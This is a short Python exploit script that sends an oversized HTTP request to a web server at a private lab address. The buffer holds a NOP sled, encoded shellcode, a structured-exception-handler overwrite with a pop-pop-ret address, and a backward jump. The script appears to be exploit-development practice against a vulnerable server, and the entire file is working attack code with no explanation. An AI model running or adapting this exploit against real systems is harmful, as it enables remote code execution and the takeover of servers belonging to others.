#!/usr/bin/python
import socket, sys
from struct import pack

host = "192.168.164.10"
port = 80

# \x20\x0d\x0e\x09\x00

def send_exploit_request():
    size = 2000
    shellcode = b"\x90"*30
    shellcode += b"\xba\xb5\x42\x9b\x29\xd9\xc7\xd9\x74\x24\xf4"
    shellcode += b"\x5d\x2b\xc9\xb1\x52\x31\x55\x12\x03\x55\x12"
    shellcode += b"\x83\x70\x46\x79\xdc\x86\xaf\xff\x1f\x76\x30"
    shellcode += b"\x60\xa9\x93\x01\xa0\xcd\xd0\x32\x10\x85\xb4"
    shellcode += b"\xbe\xdb\xcb\x2c\x34\xa9\xc3\x43\xfd\x04\x32"
    shellcode += b"\x6a\xfe\x35\x06\xed\x7c\x44\x5b\xcd\xbd\x87"
    shellcode += b"\xae\x0c\xf9\xfa\x43\x5c\x52\x70\xf1\x70\xd7"
    shellcode += b"\xcc\xca\xfb\xab\xc1\x4a\x18\x7b\xe3\x7b\x8f"
    shellcode += b"\xf7\xba\x5b\x2e\xdb\xb6\xd5\x28\x38\xf2\xac"
    shellcode += b"\xc3\x8a\x88\x2e\x05\xc3\x71\x9c\x68\xeb\x83"
    shellcode += b"\xdc\xad\xcc\x7b\xab\xc7\x2e\x01\xac\x1c\x4c"
    shellcode += b"\xdd\x39\x86\xf6\x96\x9a\x62\x06\x7a\x7c\xe1"
    shellcode += b"\x04\x37\x0a\xad\x08\xc6\xdf\xc6\x35\x43\xde"
    shellcode += b"\x08\xbc\x17\xc5\x8c\xe4\xcc\x64\x95\x40\xa2"
    shellcode += b"\x99\xc5\x2a\x1b\x3c\x8e\xc7\x48\x4d\xcd\x8f"
    shellcode += b"\xbd\x7c\xed\x4f\xaa\xf7\x9e\x7d\x75\xac\x08"
    shellcode += b"\xce\xfe\x6a\xcf\x31\xd5\xcb\x5f\xcc\xd6\x2b"
    shellcode += b"\x76\x0b\x82\x7b\xe0\xba\xab\x17\xf0\x43\x7e"
    shellcode += b"\xb7\xa0\xeb\xd1\x78\x10\x4c\x82\x10\x7a\x43"
    shellcode += b"\xfd\x01\x85\x89\x96\xa8\x7c\x5a\x59\x84\x53"
    shellcode += b"\x23\x31\xd7\xab\x52\x79\x5e\x4d\x3e\x6d\x37"
    shellcode += b"\xc6\xd7\x14\x12\x9c\x46\xd8\x88\xd9\x49\x52"
    shellcode += b"\x3f\x1e\x07\x93\x4a\x0c\xf0\x53\x01\x6e\x57"
    shellcode += b"\x6b\xbf\x06\x3b\xfe\x24\xd6\x32\xe3\xf2\x81"
    shellcode += b"\x13\xd5\x0a\x47\x8e\x4c\xa5\x75\x53\x08\x8e"
    shellcode += b"\x3d\x88\xe9\x11\xbc\x5d\x55\x36\xae\x9b\x56"
    shellcode += b"\x72\x9a\x73\x01\x2c\x74\x32\xfb\x9e\x2e\xec"
    shellcode += b"\x50\x49\xa6\x69\x9b\x4a\xb0\x75\xf6\x3c\x5c"
    shellcode += b"\xc7\xaf\x78\x63\xe8\x27\x8d\x1c\x14\xd8\x72"
    shellcode += b"\xf7\x9c\xf8\x90\xdd\xe8\x90\x0c\xb4\x50\xfd"
    shellcode += b"\xae\x63\x96\xf8\x2c\x81\x67\xff\x2d\xe0\x62"
    shellcode += b"\xbb\xe9\x19\x1f\xd4\x9f\x1d\x8c\xd5\xb5"
    buffer = shellcode
    buffer += b"\x90"* (1251-len(shellcode))
    buffer += pack("<L", (0x06eb9090))
    buffer += pack("<L", (0x10016190))
    buffer+= b"\x90"* 4
    buffer += b"\xE9\x15\xFB\xFF\xFF"
    buffer += b"\x90"* (size - len(buffer))

    #HTTP Request
    request  = buffer + b" / HTTP/1.0\r\n\r\n"
 
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host,port))
    s.send(request)
    s.close()

if __name__ == "__main__": 

    send_exploit_request()
